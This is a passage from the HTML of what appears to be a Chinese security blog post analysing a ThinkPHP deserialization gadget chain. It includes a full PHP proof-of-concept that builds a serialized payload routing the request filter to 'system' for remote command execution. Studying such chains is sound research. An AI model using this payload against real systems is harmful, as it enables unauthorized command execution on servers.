+<p>返回的filter是通过<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi mathvariant="normal">赋</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">所</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">，</mi></mrow><annotation encoding="application/x-tex">this-&gt;filter赋值的，所以可控，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">赋</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">，</span></span></span></span>data是通过$data获取</p>
+<pre><code class="language-php">protected function getData(array $data, $name)
+{
+    foreach (explode('.', $name) as $val) {
+        if (isset($data[$val])) {
+            $data = $data[$val];
+        } else {
+            return;
+        }
+    }
+
+    return $data;
+}
+</code></pre>
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">传</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">name是传入的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">的</span></span></span></span>this-&gt;config['var_ajax']，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">为</mi><mi>g</mi><mi>e</mi><mi>t</mi><mi mathvariant="normal">与</mi><mi>p</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi mathvariant="normal">所</mi><mi mathvariant="normal">有</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">所</mi><mi mathvariant="normal">以</mi></mrow><annotation encoding="application/x-tex">data为get与post所有参数，所以</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">为</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">与</span><span class="mord mathdefault">p</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span></span></span></span>data最后为get与post所有参数[$this-&gt;config['var_ajax']]</p>
+<p>最后poc如下</p>
+<pre><code class="language-php">&lt;?php
+ namespace think\process\pipes;
+ use think\model\Pivot;
+ 
+ class Windows{
+     private $files = [];
+     public function __construct(){
+         $this-&gt;files=[new Pivot()];
+     }
+ }
+ 
+ namespace think;
+ abstract class Model{
+     protected $append=[];
+     private $data=[];
+     public function __construct(){
+         $this-&gt;append=[&quot;ch1e&quot;=&gt;['hello']];
+         $this-&gt;data=[&quot;ch1e&quot;=&gt;new Request()];
+     }
+ }
+ 
+ namespace think;
+ class Request{
+     protected $hook = [];
+     protected $filter;
+     protected $config;
+     public function __construct()
+     {
+         $this-&gt;hook['visible'] = [$this, 'isAjax'];
+         $this-&gt;filter = &quot;system&quot;;
+     }
+ }
+ 
+ namespace think\model;
+ use think\Model;
+ 
+ class Pivot extends Model{
+ 
+ }
+ 
+ use think\process\pipes\Windows;
+ echo urlencode(serialize(new Windows()));
+</code></pre>
+<p><code>$this-&gt;hook['visible'] = [$this, 'isAjax'];</code>是在__call方法中调用自身的isAjax方法</p>
+<p><code>$this-&gt;filter = &quot;system&quot;;</code>是为了最终调用的函数</p>
+<p><code>$this-&gt;append=[&quot;ch1e&quot;=&gt;['hello']];</code>是满足append不为空并且键要在data数组中<br>
+<code>$this-&gt;data=[&quot;ch1e&quot;=&gt;new Request()];</code>是为了通过键去查找并且返回request对象</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220528201509223.png" alt="image-20220528201509223" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90">调用链分析</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/chong-sheng-zhi-xue-xi-thinkphp50x-fan-xu-lie-hua/">
+              <h3 class="post-title">
+                重生之学习thinkphp5.0.x反序列化
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
